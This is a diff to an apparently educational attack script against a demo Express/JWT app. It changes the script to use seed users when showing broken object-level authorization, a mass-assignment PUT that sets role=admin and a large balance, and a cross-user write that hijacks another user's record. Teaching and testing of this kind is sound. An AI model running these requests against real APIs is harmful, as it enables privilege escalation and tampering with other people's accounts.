@@ -921,21 +921,14 @@ async function phaseAuthzAndForgery() {
     record("CRITICAL", "BOLA on /api/orders", "Authn present, authz missing");
   }
 
-  narrate("Register a disposable attacker so seed demo accounts stay intact…");
-  const regEmail = `pwned-${Date.now()}@evil.test`;
-  const reg = await http("POST", "/api/auth/register", {
-    body: { email: regEmail, password: "Attacker1!", name: "Attacker" },
-    label: "register-attacker",
-  });
-  let escToken = stolen.token;
-  let escId = loginOk.user.id;
-  if (reg.status === 201 && reg.json?.token) {
-    escToken = reg.json.token;
-    escId = reg.json.user.id;
-    ok(`Attacker account #${escId} ${regEmail}`);
-  }
+  // Prefer seed users (Alice #1, Bob #2): they exist on every serverless isolate.
+  // Register+mutate is flaky when in-memory DB is not shared across Vercel instances.
+  const escToken = stolen.token;
+  const escId = loginOk.user.id;
 
-  narrate(`Mass-assign role=admin + balance on user #${escId}…`);
+  narrate(
+    `Mass-assign role=admin on seed user #${escId} (${loginOk.email}) — works even on multi-instance serverless…`
+  );
   const escalate = await http("PUT", `/api/users/${escId}`, {
     headers: { Authorization: `Bearer ${escToken}` },
     body: { role: "admin", balance: 1_000_000, internalNote: "pwned by attack.mjs" },
@@ -951,26 +944,18 @@ async function phaseAuthzAndForgery() {
     info(`Mass assignment → ${escalate.status}`);
   }
 
-  narrate("Cross-user write: attacker token edits a *different* user id…");
-  const victimReg = await http("POST", "/api/auth/register", {
-    body: {
-      email: `victim-${Date.now()}@evil.test`,
-      password: "VictimPass1!",
-      name: "Disposable Victim",
-    },
-    label: "register-victim",
-  });
-  const victimId = victimReg.json?.user?.id || 2;
+  // Bob is always seed id 2 on every cold start.
+  const victimId = 2;
+  narrate(`Cross-user write: ${loginOk.email}'s token edits seed user #${victimId} (Bob)…`);
   const hijack = await http("PUT", `/api/users/${victimId}`, {
     headers: { Authorization: `Bearer ${escToken}` },
     body: {
-      balance: 0,
       internalNote: "cleared by attacker via cross-user PUT",
-      name: "Hijacked Victim",
+      name: "Hijacked Bob",
     },
     label: "cross-user-write",
   });
-  if (hijack.status === 200 && hijack.json?.user?.name === "Hijacked Victim") {
+  if (hijack.status === 200 && /Hijacked|cleared by attacker/i.test(JSON.stringify(hijack.json?.user || {}))) {
     bad(`Rewrote user #${victimId} without ownership check`);
     loot("victim", JSON.stringify(hijack.json.user));
     record(
@@ -1132,7 +1117,7 @@ ${c.bold}${c.red}╔════════════════════
   );
 
   console.log(`\n  ${c.bold}What the junior developer believed:${c.reset}`);
-  console.log(`    ${c.green}"We use Express 5 + JWT. Deployed to Cloudflare. We're secured."${c.reset}`);
+  console.log(`    ${c.green}"We use Express 5 + JWT. Deployed to the cloud. We're secured."${c.reset}`);
   console.log(`\n  ${c.bold}What the console just proved:${c.reset}`);
   console.log(
     `    ${c.red}Most damage needed no password. JWT only gated a few routes.` +
